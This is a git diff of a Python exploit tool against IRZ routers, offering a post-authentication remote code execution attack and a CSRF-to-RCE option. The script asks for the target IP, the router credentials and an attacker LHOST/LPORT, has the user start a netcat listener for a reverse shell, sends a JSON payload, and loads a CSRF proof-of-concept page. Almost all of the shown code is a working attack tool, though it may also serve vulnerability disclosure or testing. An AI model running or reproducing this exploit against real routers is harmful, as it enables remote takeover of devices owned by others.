@@ -2,69 +2,49 @@ import os
 import requests
 import json
 
+option = "0"
 
 def main():
-
-    print("Welcome to IRZ haxor shit 0.1")
-    print("########")
+    print("####################################################")
+    print("# Welcome to IRZ CSRF to RCE Exploit - version 1.0 #")
+    print("####################################################")
     print()
-    print("Code by Xeno53")
-
-
-    print("1. Post Authentication RCE (Needs credentials)")
-    print("2. CSRF to RCE (No credentials)")
-    option = input("Select an option: ")
-
-    select_exploit(option)
-
-
-def select_exploit(user_option):
-    match user_option:
-        case "1":
-            exploit1()
-        case "2":
-            exploit2()
-
-
-def load_csrf_poc_file():
-
-    file_path = os.path.dirname(__file__) + os.sep + "poc.html"
-
-    if os.path.isfile(file_path):
-        with open(file_path) as poc_file:
-            poc_data_str = poc_file.read()
-
-        print(poc_data_str)
-    else:
-        print(f'{file_path} not found')
+    print("## by redragon of WHG & rej_ex of SAKURA SAMURAI ##")
+    print()
+    print("1. Post Authentication RCE (Needs Credentials)")
+    print("2. CSRF to RCE (No Credentials)")
+    print()
+    runit()
 
 # Post Authentication RCE exploit
 
-
+def runit():
+	option = input("Select an option: ")    
+	if option == "1":
+		exploit1()
+	elif option == "2":
+		exploit2()
+	else: print("You must select '1' or '2'. Exiting.")
+	
 def exploit1():
-    print("Running Post Auth RCE exploit")
+    print("## Running Post Auth RCE exploit")
     print()
     print()
-    router_ip = input("Enter the router ip to exploit: ")
+    router_ip = input("## Enter the router ip to exploit: ")
     router_port = int(
-        input("Enter the victim router web page port (default is 80): ") or "80")
+        input("## Enter the victim router web page port (default is 80): ") or "80")
 
-    router_user = input("Enter the username for the router login: ")
-    router_pass = input("Enter the password for the router login: ")
+    router_user = input("## Enter the username for the router login: ")
+    router_pass = input("## Enter the password for the router login: ")
 
-    LHOST = input("Enter the LHOST for the router reverse shell: ")
-    LPORT = input("Enter the LPORT for the router reverse shell: ")
+    LHOST = input("## Enter the LHOST for the router reverse shell: ")
+    LPORT = input("## Enter the LPORT for the router reverse shell: ")
 
-    nc1_str = f'Start a listener with the following command: nc -lvp {LPORT}'
+    nc1_str = f'!! Start a listener with the following command: nc -lvp {LPORT}'
 
     input(nc1_str + "\n\nPress enter once you do")
 
-    router_url = ""
-
-    if router_port == 80:
-        router_url = f'http://{router_ip}'
-    else:
-        router_url = f'http://{router_ip}:{router_port}'
+    router_url = f'http://{router_ip}:{router_port}'
 
     send_json_payload(router_url, router_user, router_pass, LHOST, LPORT)
 
@@ -96,10 +76,23 @@ def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port
     print("To fix TTY: type telnet 0.0.0.0 in the shell")
 
 
+
 def exploit2():
     print("sup: ")
 
     load_csrf_poc_file()
+
+def load_csrf_poc_file():
+
+    file_path = os.path.dirname(__file__) + os.sep + "poc.html"
+
+    if os.path.isfile(file_path):
+        with open(file_path) as poc_file:
+            poc_data_str = poc_file.read()
+
+        print(poc_data_str)
+    else:
+        print(f'{file_path} not found')
 
 
 main()
